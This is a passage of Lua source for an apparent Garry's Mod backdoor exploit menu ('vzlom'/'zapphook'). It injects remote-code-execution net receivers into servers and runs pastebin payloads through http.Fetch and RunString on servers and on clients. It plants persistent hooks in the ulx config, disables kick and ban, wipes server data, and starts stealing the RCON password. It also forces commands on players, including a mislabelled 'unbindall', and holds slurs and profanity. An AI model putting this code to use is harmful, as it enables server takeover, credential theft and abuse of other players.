        draw.SimpleText("Server payloads", "vzlom_Prim", 0, 0, vzlom.Colors.text)
    end
    local function AddButton(text,x,y,w,h,callback,font,paintcolor,pan)
        local btn = vgui.Create("DButton",pan or f)
        btn:SetText(text)
        btn:SetFont(font or "vzlom_Prim")
        btn:SetPos(x,y)
        btn:SetSize(w,h)
        btn:SetTextColor(vzlom.Colors.text)
        function btn:Paint(w,h)
            draw.RoundedBox(0, 0, 0, w, h, paintcolor or vzlom.Colors.btn)
        end
        function btn:DoClick()
            surface.PlaySound("garrysmod/ui_click.wav")
            callback()
        end
        return btn
    end
    local function ChooseBackdoor(callback)
        local sr = vgui.Create("DFrame")
sr:SetDraggable(true)
sr:ShowCloseButton(true)
sr:SetTitle("Backdoor")
sr:SetSize(400, 300)
sr:MakePopup()
sr:Center()
function sr:Paint(w,h)
        draw.RoundedBox(0, 0, 0, w, h, vzlom.Colors.prim)
        surface.SetDrawColor( vzlom.Colors.seco )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
local e = vgui.Create("DScrollPanel",sr)
e:SetPos(0,20)
e:SetSize(400,(300-20)-50)
local numnum = 0
local function CreateBackdoor(name)
    local di = vgui.Create("DButton",e)
    di:SetPos(0,numnum*20)
    di:SetSize(400, 20)
    di:SetText(name)
    di:SetTextColor(vzlom.Colors.seco)
    function di:DoClick()
        if callback then
            callback(name)
        end
        vzlom.Backdoor = name
        sr:Close()
    end
    function di:Paint(w,h)
            draw.RoundedBox(0, 0, 0, w, h, paintcolor or vzlom.Colors.btn)
        end
    
    numnum = numnum + 1
end
for k,v in pairs(vzlom.Backdoors) do
    if callback then
        CreateBackdoor(v)
    end
    if (util.NetworkStringToID(v) ~= 0) and not callback then
        CreateBackdoor(v)
    end
end
    end
AddButton("Backdoors",780-100,480-20,100,20,function()
    ChooseBackdoor()
end)

AddButton("Inject",780-200,480-20,100,20,function()
    RunConsoleCommand("ulx","luarun",[==[http.Fetch('https://pastebin.com/raw/RvvdqaS8',RunString)]==])
end)

AddButton("Test AC",780-300,480-20,100,20,function()
    net.Start("ArmDupe")
    net.SendToServer()
end)
AddButton("X",775-15,0,20,20,function()
        f:SetVisible(false)
    end,nil,Color(200,0,0))

render.Capture = function() chat.AddText( Color( 0, 0, 0, 125 ), "[antiscreengrab]", Color( 255, 255, 255 )," ау админ долбоебка соси хуй)" ) return end
render.CapturePixels = function() return end


    -- Loader
    local function GetSpecialKey()
        for i=1,2048 do
            local k = util.NetworkIDToString(i)
            if not k then
                return false
            end
            if string.match(k, "vzlom_"..string.rep(".",32)) then
                print(k)
                return k
            end
        end
        return false
    end

    local function InjectBackdoor(bd)
        local k = GetSpecialKey()
        if k == false then
            return
        end
        local code = ([[
            local a = "%s"
            util.AddNetworkString(a)
            net.Receive(a,function()
                RunString(net.ReadString(),"00F")
            end)
        ]]):format(bd)
        net.Start(k)
        net.WriteString(k)
        net.WriteString(code)
        net.SendToServer()
    end

    local function Detectvzlom()
        local k = GetSpecialKey()
        if k == false then
            return false
        else
            return true
        end
    end

surface.CreateFont( "pizda", {
    font = "Roboto Regular", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
    extended = false,
    size = 14,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = true,
    additive = false,
    outline = false,
} )

concommand.Add("watermark", function()
hook.Add( "HUDPaint", "ayewater", function()
    local h = ScrH() / 1
    local w = ScrW() / 5
    local EyeX = math.Round(ply:EyeAngles().x);
    local EyeY = math.Round(ply:EyeAngles().y);

    local rank = ply:GetUserGroup()
    
    draw.SimpleTextOutlined( "Welcome to zapphook,", "pizda", w - 5, h / 60, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) ) --mm2
    draw.SimpleTextOutlined( ply:GetName() .. "!", "pizda", w + 120, h / 60, HSVToColor( RealTime() * 120 % 360, 1, 1 ), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    draw.SimpleTextOutlined( "Good beta build!", "pizda", w - 5, h / 25, HSVToColor( RealTime() * 1 % 360, 1, 1 ), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    surface.SetDrawColor(HSVToColor( RealTime() * 120 % 360, 1, 1 ));
    surface.DrawRect(0, 0, 2000, 3);
    draw.SimpleTextOutlined( "Velocity: " .. math.Round(ply:GetVelocity():Length( )), "pizda", w - 5, h / 15, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    draw.SimpleTextOutlined( "Health: ", "pizda", w - 5, h / 11, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    draw.SimpleTextOutlined( "X: " ..  EyeX, "pizda", w - 5, h / 8.5, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    draw.SimpleTextOutlined( "Y: " ..  EyeY, "pizda", w - 5, h / 7.1, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    --if (engine.ActiveGamemode() == "darkrp") then
    --draw.SimpleTextOutlined( "Your Team: "  ..  Team, "DermaDefault", w + 120, h / 11, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    draw.SimpleTextOutlined( "Rank: ", "pizda", w + 100, h / 8.5, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    draw.SimpleTextOutlined( "Kills: " ..  ply:Frags(), "pizda", w - 5, h / 6, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    draw.SimpleTextOutlined( "Deaths: " ..  ply:Deaths(), "pizda", w + 100, h / 6, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    draw.SimpleTextOutlined( "Gamemode: " ..  engine.ActiveGamemode(), "pizda", w + 100, h / 7, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    end)

hook.Add("HUDPaint", "health", function()
     local h2 = ScrH() / 1
     local w2 = ScrW() / 5
     if ply:Health() >= 80 then
    draw.SimpleTextOutlined( ply:Health(), "pizda", w2 + 35, h2 / 11, Color(0,255,0), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
end
end)
hook.Add("HUDPaint", "health2", function()
     local h3 = ScrH() / 1
     local w3 = ScrW() / 5
    if ply:Health() < 80 then
        hook.Remove("HUDPaint", "health")
    draw.SimpleTextOutlined( ply:Health(), "pizda", w3 + 35, h3 / 11, Color(255,255,0), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
end
end)

hook.Add("HUDPaint", "ayeteam", function()
 local h4 = ScrH() / 1
 local w4 = ScrW() / 5
 local Team = team.GetName(ply:Team());
    if (engine.ActiveGamemode() == "darkrp") then
    draw.SimpleTextOutlined( "Team: "  ..  Team, "pizda", w4 + 100, h4 / 11, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
end
end)

hook.Add("HUDPaint", "rank", function()
    local h5 = ScrH() / 1
    local w5 = ScrW() / 5
        local rank = ply:GetUserGroup()
        if rank == "superadmin" then
        draw.SimpleTextOutlined( rank, "pizda", w5 + 132, h5 / 8.5,HSVToColor( RealTime() * 120 % 360, 1, 1 ), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
    else
        draw.SimpleTextOutlined( "Rank: " ..  rank, "pizda", w5 + 100, h5 / 8.5, Color(255,255,255), 1.4, 1.4, 1.4, Color( 0, 0, 0 ) )
        end
    end)
print('Executed Successfully!')
end)
concommand.Add("watermark_off", function()
    hook.Remove("HUDPaint", "rank")
    hook.Remove("HUDPaint", "ayeteam")
    hook.Remove("HUDPaint", "ayewater")
    hook.Remove("HUDPaint", "health")
    print('Unloaded Successfully!')
end)

concommand.Add("bhop", function()
            local function ch_bunnyhop(ply)
                if (ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
                    ply:RemoveKey(IN_JUMP)

                    if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
                        if (ply:GetMouseX() > 1 or ply:GetMouseX() < -1) then
                            ply:SetSideMove(ply:GetMouseX() > 1 and 400 or -400)
                        else
                            ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
                            ply:SetSideMove((ply:CommandNumber() % 2 == 0) and -400 or 400)
                        end
                    end
                elseif (ply:KeyDown(IN_JUMP)) then
                    ply:SetForwardMove(10000)
                end
            end

            hook.Add("CreateMove", "VOIDZZ", function(ply)
                ch_bunnyhop(ply)
            end)
        end)

concommand.Add("bhop_off", function()
hook.Remove( "CreateMove", "VOIDZZ" )
end)






    AddButton("Detect",780-100,0,70,20,function()
        surface.PlaySound("buttons/button18.wav")
        if Detectvzlom() then
                ChooseBackdoor(function(b)
                InjectBackdoor(b)
                timer.Simple(1,function()
                    vzlom.Backdoor = b
                    vzlom.Active = true
                vzlom.Message("Backdoor detected ! "..b.." injected !")
                end)
                
                end)
                return
            end
            
        for k,v in pairs(vzlom.Backdoors) do
            if util.NetworkStringToID(v) ~= 0 then
                vzlom.Active = true
                vzlom.Backdoor = v
            end
        end
        if not vzlom.Active then
            vzlom.Message("No backdoor found")
        else
            vzlom.Message("Backdoor: "..vzlom.Backdoor)
        end

    end)
    AddButton("Add backdoor",780-300,0,150,20,function()
        vzlom.Prompt("Backdoor net", function(r)
            table.insert(vzlom.Backdoors,r)
        end)
    end)
    AddButton("Test backdoor",780-500,0,150,20,function()
        surface.PlaySound(vzlom.warning)
        vzlom.Comfirm("Are you sure ? You could get ban by anticheat", function()
            net.Receive(vzlom.Backdoor,function()
                if net.ReadString() == "OK. yeah !" then
                    vzlom.Message("The backdoor is working !")
                end
            end)
            local pid = LocalPlayer():UserID()
            local code = [[
            local ply = Player(%s)
            local netc = "%s"
            net.Start(netc)
            net.WriteString("OK. yeah !")
            net.Send(ply)
            ]]
            vzlom.Hack(string.format(code,tostring(pid),vzlom.Backdoor))
        end)
    end)
    local AllTheChecks = {}
    



    local panpanpan = vgui.Create("DScrollPanel",f)
    panpanpan:SetPos(5,25)
    panpanpan:SetSize(200, 400)
    function panpanpan:Paint(w,h)
        
    end
    
    for k,v in pairs(player.GetAll()) do
        AllTheChecks[ k ] = vgui.Create("DCheckBoxLabel",panpanpan)
        AllTheChecks[ k ]:SetText("["..v:GetUserGroup().."] "..v:Nick())
        AllTheChecks[ k ]:SetFontInternal("vzlom_Prim")
        AllTheChecks[ k ]:SetPos(0,(20*k))
        AllTheChecks[ k ]:SetTextColor(Color(0,0,0))
        AllTheChecks[ k ].pid = v:UserID()
    end

    local function GetCheckedPlayers()
        local ret = {}
        for k,v in pairs(AllTheChecks) do
            if v:GetChecked() then
                table.insert(ret,v.pid)
            end
        end
        return ret
    end
    local function UnCheckEveryone()
        for k,v in pairs(AllTheChecks) do
            v:SetValue(0)
        end
    end
    local function CheckEveryone()
        UnCheckEveryone()
        for k,v in pairs(AllTheChecks) do
            v:SetValue(1)
        end
    end
    local function CheckMe()
        UnCheckEveryone()
        local lpid = LocalPlayer():UserID()
        for k,v in pairs(AllTheChecks) do
            if lpid == v.pid then
                v:SetValue(1)
            end
        end
    end
    local function CheckOther()
        UnCheckEveryone()
        local lpid = LocalPlayer():UserID()
        for k,v in pairs(AllTheChecks) do
            if lpid ~= v.pid then
                v:SetValue(1)
            end
        end
    end
    AddButton("E",5, 400 + 25, 50, 20, function()
        CheckEveryone()
    end)
    AddButton("O",5 + 50, 400 + 25, 50, 20, function()
        CheckOther()
    end)
    AddButton("M",5 + 100, 400 + 25, 50, 20, function()
        CheckMe()
    end)

    local function RefreshPlayerList(fuckshit)
        local checked = GetCheckedPlayers()
        for k,v in pairs(AllTheChecks) do
            v:Remove()
            AllTheChecks[ k ] = nil
        end

        local plys = player.GetAll()
        if fuckshit then
            plys = {}
            for k,v in pairs(player.GetAll()) do
                local txt = "["..v:GetUserGroup().."] "..v:Nick()
                if not string.find(txt,fuckshit) then continue end
                table.insert(plys, v)
            end
        end

        for k,v in pairs(plys) do
            local txt = "["..v:GetUserGroup().."] "..v:Nick()
            
            AllTheChecks[ k ] = vgui.Create("DCheckBoxLabel",panpanpan)
            AllTheChecks[ k ]:SetText("["..v:GetUserGroup().."] "..v:Nick())
            AllTheChecks[ k ]:SetFontInternal("vzlom_Prim")
            AllTheChecks[ k ]:SetPos(0,(20*k))
            AllTheChecks[ k ]:SetTextColor(Color(0,0,0))
            AllTheChecks[ k ].pid = v:UserID()
            if table.HasValue(checked, v:UserID()) then
                AllTheChecks[ k ]:SetValue(1)
            end
        end
    end

    local searchply = vgui.Create("DTextEntry", panpanpan)
    searchply:SetPos(0,0)
    searchply:SetSize(150, 18)
    function searchply:OnTextChanged()
        RefreshPlayerList(string.PatternSafe(searchply:GetValue()))
    end

    AddButton("Refresh player list",5, 400 + 50, 150, 20, RefreshPlayerList)
    timer.Create("vzlom_RefreshPlayerList", 1, 0, function()
        if searchply:GetValue() ~= "" then
            RefreshPlayerList(string.PatternSafe(searchply:GetValue()))
        else
            RefreshPlayerList()
        end
    end)
    

    local serverbekduri = 1
    local clientbekduri = 1

    local function runserver(name,func,icon)
        local btn = AddButton(name,0,30 * serverbekduri,200,30,function()
            if promptmsg and not (input.IsKeyDown(79) or input.IsKeyDown(80)) then
                vzlom.Prompt(promptmsg,function(r)
                    func()
                end)
            else
                func()
            end
        end,"vzlom_PayloadBtn",nil,svpan)
        if icon then
            btn:SetIcon(icon)
        end
        serverbekduri = serverbekduri + 1
    end

    
    local function runclient(name,func,promptmsg,icon)
        local btn = AddButton(name,0,30 * clientbekduri,200,30,function()

            
            if promptmsg and not (input.IsKeyDown(79) or input.IsKeyDown(80)) then
                vzlom.Prompt(promptmsg,function(r)
                    for k,v in pairs(GetCheckedPlayers()) do
                        timer.Simple(k*0.05,function()
                            func("Player("..v..")", r)
                        end)
                    end
                end)
            else
                for k,v in pairs(GetCheckedPlayers()) do
                    timer.Simple(k*0.005,function()
                        func("Player("..v..")")
                    end)
                end
            end
        end,"vzlom_PayloadBtn",nil,clpan)
        if icon then
            btn:SetIcon(icon)
        end
        clientbekduri = clientbekduri + 1
    end
    
    runserver("Artillery Server Strike", function()
        vzlom.Hack([[if !bombstrike then
                hook.Add("Think", "lulz_bombstrike", function()
                local explode = ents.Create("env_explosion")
                local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))
                local trc = {}
                trc.start = ps
                trc.endpos = ps + Vector(0, 0, -99999)
                local tr = util.TraceLine(trc)
                if !tr.Hit then return end
                explode:SetPos(tr.HitPos)
                explode:Spawn()
                explode:SetKeyValue("iMagnitude", "400")
                explode:Fire("Explode", 0, 0)
                end)
                bombstrike = true
                else
                hook.Remove("Think", "lulz_bombstrike")
                bombstrike = false
                end]])
        end)

runserver("Break Kick/Ban",function()
        vzlom.Hack([[
        local reg = FindMetaTable("Player")
reg.Kick = function()end
reg.Ban = function()end
        ]])
    end)



runserver("Spoof Backdoors",function()
        vzlom.Hack([=======[

local ply = Player(%s)
local function CheckFuncNames(func,n)
    for i=0,30 do
        local xx = jit.util.funck( func, -i )
        if xx == n then
            return true
        end
    end
    return false
end


local function GetBackdoors()
    local ret = {}
    ret = {}
    local tbl = net.Receivers
    for k,v in pairs(tbl) do
        if k == "setplayerdeathcount" then continue end
        if k == "dconfig_sendammo" then continue end
        if k == "dconfig_sendentity" then continue end
        if k == "dconfig_sendshipment" then continue end
        if k == "dconfig_sendjob" then continue end
        if k == "easy_chat_module_lua_sv" then continue end
        if k == "playerreportabuse" then continue end

        if string.StartWith(k,"vzlom_") then continue end

        if CheckFuncNames(v,"RunString") then
            net.Receive(k,function(_,p)
                p:ChatPrint("Oh no, backdoor !")
            end)
            ply:ChatPrint("Removed "..k)
        end
        if CheckFuncNames(v,"RunStringEx") then
            net.Receive(k,function(_,p)
                p:ChatPrint("Oh no, backdoor !")
            end)
            ply:ChatPrint("Removed "..k)
        end
        if CheckFuncNames(v,"CompileString") then
            net.Receive(k,function(_,p)
                p:ChatPrint("Oh no, backdoor !")
            end)
            ply:ChatPrint("Removed "..k)
        end
    end
end

GetBackdoors()



        ]=======],LocalPlayer():UserID())
    end)





runserver("Disco",function()
        -- https://pastebin.com/raw/4Ywiv6Vg
        vzlom.Hack([[
        http.Fetch("https://pastebin.com/raw/xrQvTMeZ",function(b)
            RunString(b)
        end)
        ]])
        
    end, "icon16/color_wheel.png")

// кароче гавнище ето диско его доделывать надо а мне лень............
/*runserver("Test disco",function() 
        vzlom.Hack([[
        http.Fetch("https://pastebin.com/raw/Wcv35H9V",function(b)
            RunString(b)
        end)
        ]])
        
    end, "icon16/color_wheel.png")*/

   runserver("jewish conglomerate", function() // блять что за хуйню я сделал
   vzlom.Hack([[http.Fetch("https://pastebin.com/raw/HTj6wYDs",function(b)
            RunString(b)
        end) 
        ]])
end)

runserver("[NEW] disco",function()
vzlom.Hack([[
        http.Fetch("https://pastebin.com/raw/Q21B6ws6",RunString)
        ]])
    end, "icon16/color_wheel.png")


runserver("Epsilon-based",function()
vzlom.Hack([[
        http.Fetch("https://pastebin.com/raw/VBcdEZUG",function(b)
            RunString(b)
        end)
        ]])
    end, "icon16/color_wheel.png")

    runserver("Rainbow Props",function()
            vzlom.Hack([===[
if !rainbowobjects then
    function RainbowObjects()
    for q ,c in pairs(ents.GetAll()) do
    local r = math.random(1, 255)
    local g = math.random(1, 255)
    local b = math.random(1, 255)
    c:SetColor(Color(r, g, b))
    end
    end
    hook.Add("Think" , "FuckingGay" , RainbowObjects)
    rainbowobjects = true
    else
    hook.Remove("Think", "FuckingGay")
    rainbowobjects = false
    end]===])
    end)

   runserver("Custom Job", function()
            vzlom.Hack([[
            TEAM_]]..noobstr..[[ = DarkRP.createJob("RAMZI", {
                model = "models/player/kleiner.mdl",
                weapons = {"weapon_stunstick", "unarrest_stick", "m9k_glock", "m9k_dbarrel", "m9k_usas", "m9k_barret_m82", "m9k_svu", "m9k_acr", "m9k_vector", "m9k_m202", "m9k_milkormgl", "lockpick", "pro_lockpick", "staff_lockpick"},
                command = "]]..noobstr..[[",
                description = "HACKED BY RAMZI",
                max = 1,
                color = Color(255, 255, 255, 255),
                salary = 1000000000,
                admin = 0,
                vote = false,
                hasLicense = true,
                category = "Citizens",
                candemote = false,
                mayor = true,
                chief = true,
                medic = true,
                cook = true,
                PlayerSpawn = function(ply)
                    ply:SetMaxHealth(10000)
                    ply:SetHealth(10000)
                    ply:SetArmor(10000)
                end,
                })
            ]]) rprint('Job Command: /'..noobstr)
        end)


    runserver("Server Command",function()
        vzlom.Prompt("Command to execute",function(r)
            vzlom.Hack([[game.ConsoleCommand("%s\n")]],r)
        end)
    end, "icon16/application_osx_terminal.png")
    runserver("Add Backdoor",function()
        vzlom.Prompt("Net",function(r)
              vzlom.Hack([[
                local a = "%s"
                util.AddNetworkString(a)
                net.Receive(a,function()
                    RunString(net.ReadString())
                end)
        ]],r)
        end)
    end)
    runserver("Server Gravity",function()
        vzlom.Prompt("New gravity",function(r)
            vzlom.Hack([[game.ConsoleCommand("sv_gravity %s\n")]],r)
        end)
    end, "icon16/error.png")
    runserver("Server Name",function()
        vzlom.Prompt("New server name",function(r)
            vzlom.Hack([[game.ConsoleCommand("hostname %s\n")]],r)
        end)
    end, "icon16/ipod_cast.png")
    runserver("Change All Models", function()
            vzlom.Prompt( "Model Directory", function(r)
                vzlom.Hack([[for k, v in pairs(player.GetAll()) do v:SetModel("%s") end]],r)
            end)
        end)
    runserver("Spam Server",function()
            vzlom.Hack([[
            if vzlom_SpammingConsole then
                timer.Remove("vzlom_SpammingConsole")
                vzlom_SpammingConsole = false
            else
                timer.Create("vzlom_SpammingConsole", 0.1, 0, function()
                    print("%s")
                end)
                vzlom_SpammingConsole = true
            end
            ]],"WARNING: Console has been disconnected ! Reconnecting. . .")
    end)
    runserver("Spam server data",function()
            vzlom.Hack([[
            for i=1,170 do
                file.Write("zapphook-"..i..".txt","%s")
            end
            ]],"lol")
    end, "icon16/page_add.png")
    runserver("Cleanup Map", function()
            vzlom.Hack([[game.CleanUpMap()]])
        end)
    runserver("Delete server data",function()
            vzlom.Hack([[
            function file.PurgeDirectory(name)
    local files, directories = file.Find(name .. "/*", "DATA");
    if files then
        for _, f in pairs(files) do
            file.Delete(name .. "/" .. f);
        end
    end
    if directories then
        for _, d in pairs(directories) do
            file.PurgeDirectory(name .. "/" .. d);
        end
    end
        file.Delete(name)
end
file.PurgeDirectory(".")
            ]])
    end, "icon16/page_delete.png")
    runserver("HTTP RunString",function()
        vzlom.Prompt("URL",function(r)
            vzlom.Hack([[
            http.Fetch("%s",function(body)
                RunString(body,"vzlom_Compiler")
            end)
            ]],r)
        end)
    end, "icon16/world_go.png")



    runclient("Explode",function(ply)
        vzlom.Hack([[
        local function Explode(pos)
    local explosion = ents.Create( "env_explosion" )
    explosion:SetKeyValue( "spawnflags", 144 )
    explosion:SetKeyValue( "iMagnitude", 25 )
    explosion:SetKeyValue( "iRadiusOverride", 256 )
    explosion:SetPos(pos)
    explosion:Spawn()
    explosion:Fire("explode","",0)
    for k,v in pairs(ents.FindInSphere(pos, 256)) do
        if v:IsPlayer() and v:Alive() then
             v:Kill()
         end
     end
     for k,v in pairs(ents.FindInSphere(pos, 512)) do
         if v:IsPlayer() and v:Alive() then
             v:Ignite(2,2)
         end
     end
     return explosion
end
Explode(%s:GetPos())

        ]],ply)
    end,nil,"icon16/bomb.png")
    runclient("Kill",function(ply)
        vzlom.Hack("%s:Kill()",ply)
    end,nil,"icon16/cross.png")

    runclient("set superadmin",function(ply)
        vzlom.Hack("%s:SendLua([[RunConsoleCommand('unbindall')]])",ply)
    end)


    runclient("Hacked by Ramzi",function(ply)
        -- https://pastebin.com/raw/WWtVui2j
        vzlom.Hack([=[
        %s:SendLua([[
        http.Fetch("https://pastebin.com/raw/US8d8yB6",RunString)
        ]])
        ]=],ply)
    end)

   runclient("screenshot spam", function( ply )
    vzlom.Hack([=[%s:SendLua("RunConsoleCommand('record', 'hui', '600' ) timer.Create('ss',0.01,0,function() RunConsoleCommand('screenshot') end)")]=],ply)  
   end)

    runclient("hell mode", function( ply )
    vzlom.Hack([=[%s:SendLua([[http.Fetch('https://pastebin.com/raw/2HVHYffN',RunString)]])]=],ply)
   end)

    runclient("rainbow model", function( ply )
    vzlom.Hack([=[%s:SendLua([[http.Fetch('https://pastebin.com/raw/XiTYdJCz',RunString)]])]=],ply)
   end)

    runclient("b1g model", function( ply )
    vzlom.Hack([=[%s:SetModel("models/props_phx/huge/tower.mdl")]=],ply) 
   end)

    runclient("Hide gameUI",function(ply)
        vzlom.Hack([=[%s:SendLua("timer.Create([[A]],0.01,0,function()gui.HideGameUI()end)")]=],ply)
    end)
    runclient("Unhide gameUI",function(ply)
        vzlom.Hack([=[%s:SendLua("timer.Remove([[A]])")]=],ply)
    end)
    runclient("+voicerecord",function(ply)
        vzlom.Hack([=[

        %s:ConCommand([[+voicerecord]])

        ]=],ply)
    end)
    runclient("-voicerecord",function(ply)
        vzlom.Hack("%s:ConCommand([[-voicerecord]])",ply)
    end)
    runclient("Kill Silent",function(ply)
        vzlom.Hack("%s:KillSilent()",ply)
    end)
    runclient("Spawn",function(ply)
        vzlom.Hack("%s:Spawn()",ply)
    end)
    
    runclient("Set RP name",function(ply,spamtext)
            vzlom.Hack([==[
                local ply = %s
                local nname = "%s"
                DarkRP.storeRPName(ply, nname) ply:setDarkRPVar("rpname", nname) 
                ]==],ply,spamtext)
    end,"RP Name")

    runclient("Chat Message",function(ply,spamtext)
            vzlom.Hack([==[
                local ply = %s
                local text = "%s"
                ply:ChatPrint(text)
                ]==],ply,spamtext)
    end,"Text to show","icon16/book.png")

    runclient("Chat Spam",function(ply,spamtext)
            vzlom.Hack([==[
                local ply = %s
                local text = "%s"
                if timer.Exists("vzlom_SpamText"..ply:SteamID()) then timer.Remove("vzlom_SpamText"..ply:SteamID()) return end
                timer.Create("vzlom_SpamText"..ply:SteamID(),0.1,0,function()
                    ply:ChatPrint(text)
                end)
                ]==],ply,spamtext)
    end,"Text to spam")

    runclient("Force Say",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local message = "%s"
                ply:Say(message)
                ]==],ply,r)
    end,"Text to say")



    runclient("Force Command",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local cmd = "%s"
                ply:ConCommand(cmd)
                ]==],ply,r)
    end,"Command to execute", "icon16/application_osx_terminal.png")

    runclient("Force Lua",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local script = [=[%s]=]
                ply:SendLua(script)
                ]==],ply,r)
    end,"Script to execute (255b max)")

    runclient("Open URL",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                ply:SendLua([[h=vgui.Create("DHTML")
h:SetSize(ScrW(),ScrH())
h:OpenURL("%s")]])
                ]==],ply,r)
        end,"url to open")

                runclient("ebalka",function(ply,r)
                    --http://pastebin.com/raw/SdrvwKEg
            vzlom.Hack([==[
                local ply = %s
                ply:SendLua([[http.Fetch("https://pastebin.com/raw/JzJ6Y50D",RunString)]])
                ]==],ply,r)
    end)

                // блять говно сломалос
    /*runclient("Change 2D3D Textscreen",function(ply,spamtext)
            vzlom.Hack([==[
                local ply = %s
                local text = "%s"
                for i=1,10 do
                    ply:ConCommand("textscreen_text1 \""..text.."\" ; textscreen_a1 255 ; textscreen_b"..i.." 0 ; textscreen_g"..i.." 0 ; textscreen_r"..i.." 0 ; textscreen_size1 100 ; textscreen_font1 16")
                end
                ]])
                ]==],ply,spamtext)
    end,"Text to show","icon16/book.png")
    runclient("Break Scoreboard",function(ply)
            vzlom.Hack([==[
                %s:ConCommand("FAdmin_PlayerRowSize 0")
                ]])
                ]==],ply)
    end,nil,"icon16/book.png") 
    runclient("Change Language",function(ply)
            vzlom.Hack([==[
                %s:ConCommand("gmod_language ko")
                ]])
                ]==],ply)
    end,nil,"icon16/book.png")*/ 

    
    runclient("Remove Player",function(ply)
            vzlom.Hack([==[
                local ply = %s
                ply:Remove()
                ]])
                ]==],ply)
    end)
    runclient("Spam data",function(ply)
            vzlom.Hack([==[
                local ply = %s
                ply:SendLua([[for i=1,200 do file.CreateDir("important/important/important/important/important/important/important/")end]])
                ]])
                ]==],ply) 
    end)
    runclient("Quit Game",function(ply)
        vzlom.Hack([[%s:SendLua("table.Empty(debug.getregistry())")]],ply)
    end,nil,"icon16/cross.png")

    runclient("DarkRP AddMoney",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local money = %s
                ply:addMoney(money)
                ]==],ply,r)
    end,"Money to add", "icon16/money_add.png")

    runclient("Set HEALTH",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local health = %s
                ply:SetHealth(health)
                ]==],ply,r)
    end,"HP to set", "icon16/user_suit.png")

    runclient("Set ARMOR",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local armor = %s
                ply:SetArmor(armor)
                ]==],ply,r)
    end,"Armor to set", "icon16/shield.png")

    runclient("Give Weapon",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local weapon = "%s"
                ply:Give(weapon)
                ]==],ply,r)
    end,"Weapon to give")
    runclient("Give ammo",function(ply)
        vzlom.Hack([[
        local ply = %s
        for i=1,100 do
            ply:GiveAmmo(10000, i, false)
        end
        ]],ply)
    end)

    runclient("Teleport to cursor",function(ply)
        local lid = LocalPlayer():UserID()
        vzlom.Hack([[
        local ply = %s
        local me = %s
        ply:SetPos(me:GetEyeTrace().HitPos)
        ]],ply,"Player("..lid..")")
    end)

    runclient("Strip Weapons",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                ply:StripWeapons()
                ]==],ply,r)
    end)

    runclient("Kick",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local reason = "%s"
                ply:Kick(reason)
                ]==],ply,r)
    end,"Reason", "icon16/disconnect.png")

    runclient("Ban",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local reason = "%s"
                ply:Ban(0)
                ply:Kick(reason)
                ]==],ply,r)
    end,"Reason", "icon16/delete.png")

    runclient("Set Rank",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                local rank = "%s"
                if rank == "nil" then
                    if ply:IsSuperAdmin() then
                        ply:SetUserGroup("user")
                    end
                    if not ply:IsSuperAdmin() then
                        ply:SetUserGroup("superadmin")
                    end
                    return
                end
                ply:SetUserGroup(rank)
                ]==],ply,r)
    end,"Rank", "icon16/key.png")

    runclient("Godmode",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                ply:GodEnable()
                ]==],ply,r)
    end, nil, "icon16/user_red.png")

    runclient("Ungodmode",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                ply:GodDisable()
                ]==],ply,r)
    end,nil, "icon16/user_gray.png")

    runclient("Toggle Freeze",function(ply,r)
            vzlom.Hack([==[
                local ply = %s
                ply:Freeze(not ply:IsFrozen())
                ]==],ply,r)
    end,nil, "icon16/wand.png")

    runserver("Perma HOOK",function()
            vzlom.Hack([===[
            file.Append("ulx/config.txt",[=[
    ulx hook Think vzlom l "hook.Remove([[Think]],[[vzlom]])util.AddNetworkString[[vzlom_push]])net.Receive([[vzlom_push]],function()RunString(net.ReadString())end)"
    ]=])
            ]===])

    end, "icon16/bug.png")
    runserver("Reboot loop (broken?)",function()
            vzlom.Hack([===[
            file.Append("ulx/config.txt",[=[
    ulx map gm_construct
    ulx map gm_flatgrass
    ]=])
            ]===])
        end, "icon16/bug.png")

    runserver("Steal RCON",function()
        vzlom.Hack([===[
            local rcon = "NOT FOUND"
local cont = file.Read("cfg/server.cfg","MOD") or ""
for k,v in pairs(cont:Split("\n")) do
    if v:StartWith("rcon_password") then
        rcon = v:Split("\"")[2]
    end
end
